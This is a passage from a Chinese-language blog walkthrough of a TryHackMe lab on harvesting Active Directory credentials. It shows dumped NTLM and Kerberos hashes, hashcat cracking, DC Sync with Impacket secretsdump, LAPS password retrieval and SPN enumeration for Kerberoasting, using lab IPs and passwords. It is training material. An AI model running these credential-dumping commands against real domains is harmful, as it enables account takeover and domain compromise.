thm.red\thm-local:<span class="hljs-number">1116</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">077</span>cccc23f8ab7031726a3b70c694a49:::
thm.red\admin:<span class="hljs-number">1118</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">077</span>cccc23f8ab7031726a3b70c694a49:::
thm.red\svc-thm:<span class="hljs-number">1119</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">5858</span>d47a41e40b40f294b3100bea611f:::
thm.red\bk-admin:<span class="hljs-number">1120</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">077</span>cccc23f8ab7031726a3b70c694a49:::
thm.red\test-user:<span class="hljs-number">1127</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">5858</span>d47a41e40b40f294b3100bea611f:::
sshd:<span class="hljs-number">1128</span>:aad3b435b51404eeaad3b435b51404ee:a78d0aa18c049d268b742ea360849666:::
[*] Kerberos keys from /tmp/ntds.dit 
Administrator:aes256-cts-hmac-sha1-<span class="hljs-number">96</span>:<span class="hljs-number">510</span>e0d5515009dc29df8e921088e82b2da0955ed41e83d4c211031b99118bf30
Administrator:aes128-cts-hmac-sha1-<span class="hljs-number">96</span>:bab514a24ef3df25c182f5520bfc54a0
Administrator:des-cbc-md5:<span class="hljs-number">6</span>d34e608f8574632
CREDS-HARVESTIN$:aes256-cts-hmac-sha1-<span class="hljs-number">96</span>:<span class="hljs-number">26</span>cde2aa6599210f99ebbde586d7c21c9181248298bc4648fb773ecd1b0f057b
CREDS-HARVESTIN$:aes128-cts-hmac-sha1-<span class="hljs-number">96</span>:<span class="hljs-number">6</span>e1ab8804fac1ef56fc9761c1b1ddd62
CREDS-HARVESTIN$:des-cbc-md5:<span class="hljs-number">860</span>ed037c4467a13
krbtgt:aes256-cts-hmac-sha1-<span class="hljs-number">96</span>:<span class="hljs-number">24</span>fad271ecff882bfce29d8464d84087c58e5db4083759e69d099ecb31573ad3
krbtgt:aes128-cts-hmac-sha1-<span class="hljs-number">96</span>:<span class="hljs-number">2</span>feb0c1629b37163d59d4c0deb5ce64c
krbtgt:des-cbc-md5:d92ffd4abf02b049
thm.red\thm:aes256-cts-hmac-sha1-<span class="hljs-number">96</span>:<span class="hljs-number">2</span>a54bb9728201d8250789f5e793db4097630dcad82c93bcf9342cb8bf20443ca
thm.red\thm:aes128-cts-hmac-sha1-<span class="hljs-number">96</span>:<span class="hljs-number">70179</span>d57a210f22ad094726be50f703c
thm.red\thm:des-cbc-md5:<span class="hljs-number">794</span>f3889e646e383
thm.red\victim:aes256-cts-hmac-sha1-<span class="hljs-number">96</span>:<span class="hljs-number">588635</span>fd39ef8a9a0dd1590285712cb2899d0ba092a6e4e87133e4c522be24ac
thm.red\victim:aes128-cts-hmac-sha1-<span class="hljs-number">96</span>:<span class="hljs-number">672064</span>af4dd22ebf2f0f38d86eaf0529
thm.red\victim:des-cbc-md5:<span class="hljs-number">457</span>cdc673d3b0d85
thm.red\thm-local:aes256-cts-hmac-sha1-<span class="hljs-number">96</span>:a7e2212b58079608beb08542187c9bef1419d60a0daf84052e25e35de1f04a26
thm.red\thm-local:aes128-cts-hmac-sha1-<span class="hljs-number">96</span>:<span class="hljs-number">7</span>c929b738f490328b13fb14a6cfb09cf
thm.red\thm-local:des-cbc-md5:<span class="hljs-number">9</span>e3bdc4c2a6b62c4
thm.red\admin:aes256-cts-hmac-sha1-<span class="hljs-number">96</span>:<span class="hljs-number">7441</span>bc46b3e9c577dae9b106d4e4dd830ec7a49e7f1df1177ab2f349d2867c6f
thm.red\admin:aes128-cts-hmac-sha1-<span class="hljs-number">96</span>:<span class="hljs-number">6</span>ffd821580f6ed556aa51468dc1325e6
thm.red\admin:des-cbc-md5:<span class="hljs-number">32</span>a8a201d3080b2f
thm.red\svc-thm:aes256-cts-hmac-sha1-<span class="hljs-number">96</span>:<span class="hljs-number">8</span>de18b5b63fe4083e22f09dcbaf7fa62f1d409827b94719fe2b0e12f5e5c798d
thm.red\svc-thm:aes128-cts-hmac-sha1-<span class="hljs-number">96</span>:<span class="hljs-number">9</span>fa57f1b464153d547cca1e72ad6bc8d
thm.red\svc-thm:des-cbc-md5:f8e57c49f7dc671c
thm.red\bk-admin:aes256-cts-hmac-sha1-<span class="hljs-number">96</span>:<span class="hljs-number">48</span>b7d6de0b3ef3020b2af33aa43a963494d22ccbea14a0ee13b63edb1295400e
thm.red\bk-admin:aes128-cts-hmac-sha1-<span class="hljs-number">96</span>:a6108bf8422e93d46c2aef5f3881d546
thm.red\bk-admin:des-cbc-md5:<span class="hljs-number">108</span>cc2b0d3100767
thm.red\test-user:aes256-cts-hmac-sha1-<span class="hljs-number">96</span>:<span class="hljs-number">2102</span>b093adef0a9ddafe0ad5252df78f05340b19dfac8af85a4b4df25f6ab660
thm.red\test-user:aes128-cts-hmac-sha1-<span class="hljs-number">96</span>:dba3f53ecee22330b5776043cd203b64
thm.red\test-user:des-cbc-md5:aec8e3325b85316b
sshd:aes256-cts-hmac-sha1-<span class="hljs-number">96</span>:<span class="hljs-number">07046594</span>c869e3e8094de5caa21539ee557b4d3249443e1f8b528c4495725242
sshd:aes128-cts-hmac-sha1-<span class="hljs-number">96</span>:e228ee34b8265323725b85c6c3c7d85f
sshd:des-cbc-md5:b58f850b4c082cc7
[*] Cleaning up...</code></pre>
<blockquote>
<p>目标系统的引导密钥值为：0x36c8d26ec0df8b23ce63bcefa6e2d821</p>
<p>bk-admin用户的NTLM密码哈希值为：thm.red\bk-admin:1120:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::</p>
</blockquote>
<p>我们可以使用hashcat对bk-admin用户的密码哈希进行解密：</p>
<pre><code class="hljs scss">root<span class="hljs-keyword">@hekeats</span>$ nano hash.txt
#thm.red\<span class="hljs-attribute">bk-admin</span>:<span class="hljs-number">1120</span>:aad3b435b51404eeaad3b435b51404<span class="hljs-attribute">ee</span>:<span class="hljs-number">077</span>cccc23f8ab7031726a3b70c694a49:::
root<span class="hljs-keyword">@hekeats</span>$ hashcat -m <span class="hljs-number">1000</span> -a <span class="hljs-number">0</span>  hash.txt /usr/share/wordlists/passwords/rockyou.txt</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304195145292.png" alt="image-20240304195145292"></p>
<p>bk-admin用户的密码明文为：Passw0rd123</p>
<h2 id="远程转储攻击者有凭据">远程转储(攻击者有凭据)</h2>
<p>我们刚才讨论了如何在没有凭据的情况下从目标DC的内存中获取哈希，接下来，我们将展示如何远程转储目标系统和域控制器中的哈希值，这需要我们拥有相关凭据，例如密码或NTLM哈希值。我们还需要拥有对目标域控制器具有管理及访问权限的用户或者使用下文的DC Sync部分内容中所讨论的具有特殊权限的凭据。</p>
<h3 id="dc-syncdc同步">DC Sync(DC同步)</h3>
<p>DC Sync是攻击者会在Active Directory环境中执行的一种常用攻击方式，目的是远程转储凭据。当攻击者获得具有以下AD权限的帐户(具有必要权限的特殊帐户)或者目标网络环境中的AD admin帐户被攻破时，此类攻击就可能会发生：</p>
<ul>
<li>Replicating Directory Changes</li>
<li>Replicating Directory Changes All</li>
<li>Replicating Directory Changes in Filtered Set</li>
</ul>
<p>攻击者可以利用上述这些AD配置来执行域复制，通常也被称为“DC Sync”或域控制器同步。有关DC Sync攻击的更多信息，可以尝试访问以下博客内容：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hekeats-L/p/17502008.html">【THM】Persisting Active Directory(AD域权限维持)-红队</a></li>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/627856061">滥用DCSync介绍-知乎</a></li>
</ul>
<p>接下来，我们将使用Impacket SecretsDump脚本工具来演示DC同步攻击：</p>
<pre><code class="hljs scss">#在攻击机上针对目标DC执行域控制器同步攻击

#注意：请使用`THM<span class="hljs-selector-class">.red</span>/thm`作为与本小节练习相关的Active Directory用户，因为该用户具有管理员权限。

python3 /opt/impacket/examples/secretsdump<span class="hljs-selector-class">.py</span> -just-dc THM<span class="hljs-selector-class">.red</span>/&lt;AD_Admin_User&gt;<span class="hljs-keyword">@MACHINE</span>_IP

python3 /opt/impacket/examples/secretsdump.py -just-dc THM.red/thm@<span class="hljs-number">10.10</span>.<span class="hljs-number">63.254</span>
#Password：Passw0rd!</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304195607596.png" alt="image-20240304195607596"></p>
<p>让我们进一步解释一下上述命令：</p>
<ul>
<li><code>-just-dc</code> 命令参数用于指定提取目标DC中的NTDS文件。</li>
<li><code>thm.red/AD_Admin_User</code> 命令参数是经过身份验证的域用户(格式为domain/user)。</li>
</ul>
<p>注意，如果我们只想转储目标DC中所存储的NTLM密码哈希值，那么我们可以使用<code>-just-dc-ntlm</code>参数来指定，命令如下所示：</p>
<pre><code class="hljs scss">#执行DC Sync攻击以转储NTLM密码哈希
#注意：请使用`THM<span class="hljs-selector-class">.red</span>/thm`作为与本小节练习相关的Active Directory用户，因为该用户具有管理员权限。

python3 /opt/impacket/examples/secretsdump<span class="hljs-selector-class">.py</span> -just-dc-ntlm THM<span class="hljs-selector-class">.red</span>/&lt;AD_Admin_User&gt;<span class="hljs-keyword">@MACHINE</span>_IP

python3 /opt/impacket/examples/secretsdump.py -just-dc-ntlm THM.red/thm@<span class="hljs-number">10.10</span>.<span class="hljs-number">63.254</span>
#Password：Passw0rd!</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304195821287.png" alt="image-20240304195821287"></p>
<p>当我们获取到目标用户的NTLM哈希之后，我们就可以基于已获取的NTLM哈希来模拟相关的特定用户身份或者使用类似于hashcat的破解工具来破解哈希值。我们可以使用<code>-m 1000</code>模式来破解Windows NTLM哈希：</p>
<pre><code class="hljs scss">#先将要破解的密码哈希值存储到hash<span class="hljs-selector-class">.txt</span>文件中

hashcat -m <span class="hljs-number">1000</span> -<span class="hljs-selector-tag">a</span> <span class="hljs-number">0</span>  hash<span class="hljs-selector-class">.txt</span> /path/to/wordlist/passwords/rockyou<span class="hljs-selector-class">.txt</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304195938684.png" alt="image-20240304195938684"></p>
<h1 id="0x08-laps本地管理员密码解决方案">0x08 LAPS(本地管理员密码解决方案)</h1>
<p>本小节将讨论如何在已经配置并启用了LAPS(本地管理员密码解决方案)功能的Active Directory环境中枚举和获取目标机的本地管理员密码。</p>
<h2 id="组策略首选项gpp">组策略首选项(GPP)</h2>
<p>Windows操作系统有内置管理员(built-in Administrator)帐户，用户可以使用密码对其进行访问。对于攻击者而言，在具有许多计算机的大型Windows环境中更改密码更加有挑战性，因此，攻击者可以尝试基于Microsoft实现一种使用组策略首选项(GPP)来跨工作站更改本地管理员帐户的方法。</p>
<p>GPP(组策略首选项)是一种允许管理员创建具有嵌入式凭据的域策略的工具。一旦部署了GPP，就会在目标机器的SYSVOL文件夹中创建不同的XML文件，SYSVOL是Active Directory的一个重要组件，它可以在NTFS卷上创建一个共享目录，所有经过身份验证的域用户都能够以可读权限来访问该共享目录。</p>
<p>与GPP相关的XML文件还将包含一个使用AES-256位加密算法进行加密处理的密码，这种加密技术足够好，直到微软官方以某种方式在<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">MSDN</a>上公布了它的私钥。由于域用户可以读取SYSVOL文件夹的内容，因此攻击者对该文件夹中所存储的密码进行解密变得很容易。</p>
<p>tips：破解SYSVOL的加密密码的工具之一是<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">Get-GPPPassword</a>脚本。</p>
<h2 id="本地管理员密码解决方案laps介绍">本地管理员密码解决方案(LAPS)介绍</h2>
<p>在2015年，微软删除了Windows计算机在SYSVOL文件夹中存储加密密码的功能，引入了本地管理员密码解决方案(LAPS)，LAPS能够提供一种更安全的方法来远程管理Windows机器上的本地管理员密码。</p>
<p>LAPS方法将在AD环境中包含计算机对象的两个新属性(ms-mcs-AdmPwd和ms-mcs-AdmPwdExpirationTime)，其中<code>ms-mcs-AdmPwd</code>属性包含本地管理员的明文密码，而<code>ms-mcs-AdmPwdExpirationTime</code>属性则包含密码过期时间。</p>
<p>tips：LAPS将使用<code>admpwd.dll</code>修改本地管理员密码，并会更新相关的<code>ms-mcs-AdmPwd</code>的值。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304200321271.png" alt="image-20240304200321271"></p>
<h2 id="枚举laps">枚举LAPS</h2>
<p>首先，我们可以检查目标计算机中是否安装了LAPS，这可以通过检查<code>admpwd.dll</code>路径来完成(查看AdmPwd.dll文件是否存在)：</p>
<pre><code class="hljs scss">C:\Users\thm&gt;dir <span class="hljs-string">"C:\Program Files\LAPS\CSE"</span>
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Program Files\LAPS\CSE

<span class="hljs-number">06</span>/<span class="hljs-number">06</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">01</span>:<span class="hljs-number">01</span> PM    &lt;DIR&gt;          .
<span class="hljs-number">06</span>/<span class="hljs-number">06</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">01</span>:<span class="hljs-number">01</span> PM    &lt;DIR&gt;          ..
<span class="hljs-number">05</span>/<span class="hljs-number">05</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">07</span>:<span class="hljs-number">04</span> AM           <span class="hljs-number">184</span>,<span class="hljs-number">232</span> AdmPwd.dll
               <span class="hljs-number">1</span> <span class="hljs-built_in">File</span>(s)        <span class="hljs-number">184</span>,<span class="hljs-number">232</span> bytes
               <span class="hljs-number">2</span> <span class="hljs-built_in">Dir</span>(s)  <span class="hljs-number">10</span>,<span class="hljs-number">342</span>,<span class="hljs-number">387</span>,<span class="hljs-number">712</span> bytes free</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304200421177.png" alt="image-20240304200421177"></p>
<p>上述的输出结果能够确认目标机器上有LAPS，接下来让我们检查<code>AdmPwd</code> cmdlet的可用命令，如下所示：</p>
<pre><code class="hljs scss">#列出可用于枚举LAPS的PowerShell cmdlet
<span class="hljs-selector-id">#powershell</span> -ex bypass

PS C:\Users\thm&gt; Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          <span class="hljs-number">5.0</span>.<span class="hljs-number">0.0</span>    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 <span class="hljs-number">5.0</span>.<span class="hljs-number">0.0</span>    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               <span class="hljs-number">5.0</span>.<span class="hljs-number">0.0</span>    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 <span class="hljs-number">5.0</span>.<span class="hljs-number">0.0</span>    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   <span class="hljs-number">5.0</span>.<span class="hljs-number">0.0</span>    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   <span class="hljs-number">5.0</span>.<span class="hljs-number">0.0</span>    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  <span class="hljs-number">5.0</span>.<span class="hljs-number">0.0</span>    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              <span class="hljs-number">5.0</span>.<span class="hljs-number">0.0</span>    AdmPwd.PS</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304200515110.png" alt="image-20240304200515110"></p>
<p>接下来，我们需要找到哪个AD组织单元(OU)具有处理LAPS的“所有扩展权限”属性，我们将使用“Find-AdmPwdExtendedRights”cmdlet并附加我们所需要检查的组织单元(OU)。</p>
<p>注意：获取可用OU可以在我们执行枚举步骤时完成，本例中的目标OU是<code>THMorg</code>，我们还可以使用<code>-Identity *</code>参数来列出所有可用的OU。</p>
<pre><code class="hljs scss">#查找具有AdmPwdExtendedRights属性的用户

PS C:\Users\thm&gt; Find-AdmPwdExtendedRights -Identity THMorg

ObjectDN                                      ExtendedRightHolders
--------                                      --------------------
OU=THMorg,DC=thm,DC=red                       {THM\LAPsReader}</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304200654836.png" alt="image-20240304200654836"></p>
<p>上面输出显示在THMorg中的LAPsReader组对于LAPS具有正确的访问权限，让我们来检查一下这个组及其成员。</p>
<pre><code class="hljs scss">#查找属于LAPsReader组的用户

PS C:\Users\thm&gt; net groups <span class="hljs-string">"LAPsReader"</span>
Group name     LAPsReader
Comment

Members

-------------------------------------------------------------------------------
bk-admin
The command completed successfully.

PS C:\Users\thm&gt; net user bk-admin
User name                    bk-admin
Full Name                    THM Admin BK
Comment
User<span class="hljs-string">'s comment</span>
<span class="hljs-string">Country/region code          000 (System Default)</span>
<span class="hljs-string">Account active               Yes</span>
<span class="hljs-string">Account expires              Never</span>
<span class="hljs-string"></span>
<span class="hljs-string">Password last set            6/4/2022 10:33:48 AM</span>
<span class="hljs-string">Password expires             Never</span>
<span class="hljs-string">Password changeable          6/5/2022 10:33:48 AM</span>
<span class="hljs-string">Password required            Yes</span>
<span class="hljs-string">User may change password     Yes</span>
<span class="hljs-string"></span>
<span class="hljs-string">Workstations allowed         All</span>
<span class="hljs-string">Logon script</span>
<span class="hljs-string">User profile</span>
<span class="hljs-string">Home directory</span>
<span class="hljs-string">Last logon                   6/9/2022 3:47:28 PM</span>
<span class="hljs-string"></span>
<span class="hljs-string">Logon hours allowed          All</span>
<span class="hljs-string"></span>
<span class="hljs-string">Local Group Memberships</span>
<span class="hljs-string">Global Group memberships     *Domain Users         *Domain Admins</span>
<span class="hljs-string">                             *LAPsReader           *Enterprise Admins</span>
<span class="hljs-string">The command completed successfully.</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304200816399.png" alt="image-20240304200816399"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304200826833.png" alt="image-20240304200826833"></p>
<h2 id="获取密码">获取密码</h2>
<p>通过上述枚举操作，我们可以发现bk-admin用户是LAPsReader组的成员，因此为了获得目标LAPS中所存储的密码，我们需要入侵或冒充bk-admin用户。在找到正确的用户之后，我们就可以通过向启用了LAPS的目标计算机使用Get-AdmPwdPassword命令来获取LAPS中所存储的密码。</p>
<pre><code class="hljs scss">#使用正确的用户来获取目标LAPS中所存储的密码

PS C:\&gt; Get-AdmPwdPassword -ComputerName creds-harvestin

ComputerName         DistinguishedName                             Password           ExpirationTimestamp
------------         -----------------                             --------           -------------------
CREDS-HARVESTIN      CN=CREDS-HARVESTIN,OU=THMorg,DC=thm,DC=red    ***************    <span class="hljs-number">2</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2338</span> <span class="hljs-number">11</span>:<span class="hljs-number">05</span>:<span class="hljs-number">2</span>...</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240304200947242.png" alt="image-20240304200947242"></p>
<p>注意：在实际的AD环境中，LAPS仅会在特定的计算机上被启用；因此，我们需要枚举并找到正确的目标计算机以及正确的用户帐户，以便能够获取LAPS中的密码。在本小节的实验练习中，我们可以使用目标机器上C:\Tool目录中的<a target="_blank" rel="noopener" href="https://github.com/leoloobeek/LAPSToolkit">LAPSToolkit</a>脚本来解决相关的枚举问题。</p>
<p>tips：在默认情况下，只有域管理员才能读取LAPS中的密码。</p>
<h2 id="答题">答题</h2>
<pre><code class="hljs scss">PS C:\&gt; Import-Module ActiveDirectory
PS C:\&gt; (Get-ADComputer <span class="hljs-variable">$env</span>:COMPUTERNAME -Properties *).DistinguishedName #获取目标机信息
PS C:\&gt; Find-AdmPwdExtendedRights -Identity <span class="hljs-string">"OU=THMorg,DC=thm,DC=red"</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240305160908460.png" alt="image-20240305160908460"></p>
<pre><code class="hljs scss">PS C:\&gt; Get-AdmPwdPassword CREDS-HARVESTIN</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240305161134702.png" alt="image-20240305161134702"></p>
<pre><code class="hljs scss">PS C:\&gt; Get-ADGroupMember -Identity <span class="hljs-string">"LAPsReader"</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240305161228621.png" alt="image-20240305161228621"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240305161036051.png" alt="image-20240305161036051"></p>
<h1 id="0x09-其他ad凭据收集方式">0x09 其他AD凭据收集方式</h1>
<p>在上文内容中，所假设的场景是我们已经拥有对目标系统的初始访问权限，并且将尝试从Windows操作系统的内存中或者各种敏感文件中获取凭据，而在其他情况下，我们还可以尝试针对目标网络执行某些攻击以获取相关凭据。</p>
<p>本小节将简要介绍一些可用于获取密码哈希的Windows攻击和AD攻击。在深入了解更多关于AD攻击的细节之前，建议先熟悉<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Kerberos_(protocol)">Kerberos协议</a>和NTLM(新技术LAN管理器-New Technology LAN Manager)，这是一套用于对计算机用户进行身份验证的安全协议。</p>
<h2 id="kerberoasting攻击">Kerberoasting攻击</h2>
<p>Kerberoasting是一种常见的AD攻击，可用于获取AD票据，从而帮助攻击者实现权限维持。</p>
<p>为了有效地执行这种攻击，攻击者必须能够访问SPN(服务主体名称)帐户，如IIS用户、MSSQL等。Kerberoasting攻击主要涉及请求票据授予票据(TGT)和票据授予服务(TGS)，这种攻击的最终目标是实现权限提升和内网横向移动。</p>
<p>有关该攻击的更多详细信息，请尝试阅读以下博客内容：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hekeats-L/p/17502008.html">【THM】Persisting Active Directory(AD域权限维持)-红队</a></li>
</ul>
<p>现在让我们来快速演示一下此类攻击：首先，我们需要找到目标域控制器的一个SPN帐户，然后我们再发送请求以获得TGS票据。</p>
<p>如以下命令所示，我们将在攻击机上使用GetUserSPNs.py脚本来针对目标机器枚举SPN帐户。</p>
<p>tips：在本文的相关实验中，我们所针对的目标帐户是<code>THM.red/thm</code>，它的密码为<code>Passw0rd!</code>。</p>
<pre><code class="hljs scss">#枚举SPN帐户

<span class="hljs-selector-id">#python3</span> /impacket/examples/GetUserSPNs<span class="hljs-selector-class">.py</span> -dc-ip MACHINE_IP THM<span class="hljs-selector-class">.red</span>/thm

python3 ./impacket/examples/GetUserSPNs<span class="hljs-selector-class">.py</span> -dc-ip <span class="hljs-number">10.10</span><span class="hljs-selector-class">.192</span><span class="hljs-selector-class">.231</span> THM<span class="hljs-selector-class">.red</span>/thm
<span class="hljs-selector-id">#Password</span>：Passw0rd!
Impacket v0<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.0</span> - Copyright <span class="hljs-number">2022</span> SecureAuth Corporation

Password:
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------------  -------  --------  --------------------------  ---------  ----------
http/creds-harvestin.thm.red  svc-thm            <span class="hljs-number">2022</span>-<span class="hljs-number">06</span>-<span class="hljs-number">10</span> <span class="hljs-number">17</span>:<span class="hljs-number">47</span>:<span class="hljs-number">33.796826</span>  &lt;never&gt;</code></pre>
